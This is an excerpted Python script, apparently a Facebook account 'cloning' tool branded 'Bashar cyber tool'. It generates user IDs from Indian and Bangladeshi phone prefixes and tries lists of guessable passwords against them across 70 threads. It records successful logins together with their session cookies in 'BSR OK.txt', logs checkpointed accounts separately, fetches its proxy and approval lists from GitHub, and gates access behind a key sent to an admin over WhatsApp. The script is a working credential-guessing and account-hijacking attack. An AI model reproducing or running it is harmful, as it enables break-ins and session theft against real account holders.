...
try:
    ...
    os.system('pip install mechanize requests futures==2 > /dev/null')
    os.system('python run.py')
print('\n\033[1;32m[•]  PLEASE WAIT..LOADING...');(1)
#os.system('xdg-open https://www.facebook.com/profile.php?id=100094736804054&mibextid=vk8aRt')
print('\n\033[1;36m[•]   WELCOME TO BASHAR CYBER TOOL...');(3)
...
try:
	prox= requests.get('https://raw.githubusercontent.com/Bashar00113525/Aproval.txt/main/Proxy').text
...
logo=("""                  
\033[38;5;46m
888888b.    .d8888b.  8888888b.  
888  "88b  d88P  Y88b 888   Y88b 
888  .88P  Y88b.      888    888 
8888888K.   "Y888b.   888   d88P 
888  "Y88b     "Y88b. 8888888P"  
888    888       "888 888 T88b   
888   d88P Y88b  d88P 888  T88b  
8888888P"   "Y8888P"  888   T88b
\033[38;5;46m=================================""")
...
def menu_apikey():
 ...
 # server = requests.get('https://github.com/zawmyoaunghk/zawmyoaunghk/blob/main/key.txt').text
  ...
  print(f"")
  print(f"\x1b[1;92m ok                                                      ");time.sleep (0.1) 
  print(f"")
  ...
  print(f"")
  try:
    httpCaht = requests.get("https://raw.githubusercontent.com/Bashar00113525/Aproval.txt/main/Aprooval.txt").text
    if id in httpCaht:
      ...
      print(f" \033[1;33m  THIS TOOL IS NOT FOR YOU\033[1;37m\n")
      print(f"\033[1;31m   COPY YOUR KEY AND SEND TO ADMIN  ");time.sleep(0.1)
      print(f"    Send key  to Admin and get aproval"); time.sleep(2)
      os.system(f'xdg-open https://wa.me/+8801580857538?text='+id)
      time.sleep(2)
      sys.exit()
  except:
    sys.exit()
...
def bsr():
	...
	print('[3] RANDOM INDIA CLONING')
	print('[4] RANDOM BD CLONING')
	print('[0]\x1b[1;91m EXIT ')
	print('\33[1;37m----------------------------------------------')
	bsr1 = input('[•] SELECT OPTION : ')
	if bsr1 =='1':
		annu()
	if bsr1 =='0':
		exit()
...
def india():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=['57273200','57575751','59039200','57565752',guru[1:],guru,uid[5:]]
            yaari.submit(rcrack,uid,pwx,tl)
            #print(uid,pwx)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
...
def bd():
    ...
    os.system('clear')
    print(logo)
    print(' EXAMPLE  : 017*,018*,019*,015*,014*,013*')
    lines()
    kode = input(' PUT CODE : ')
    lines()
    os.system('clear')
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[uid,uid[5:],uid[4:],uid[3:],uid[:6]]
            yaari.submit(rcrack,uid,pwx,tl)
           # print(uid,pwx)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            sys.stdout.write(f'\r[\033[1;97mBASHAR\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks)));sys.stdout.flush()
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[151:166]
                print('\033[1;32m[BSR-OK] '+cid+' | '+ps+'\033[0;97m\n[‎‎🍪]\033[1;33m 🅲︎🅾︎🅾︎🅺︎🅸︎🅴︎ = \033[1;32m'+coki+  '  ''  \033[0;97m')
                open('BSR OK.txt', 'a').write(cid+' | '+ps+ coki+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[BSR-CP] '+uid+' | '+ps+'\x1b[1;97m')
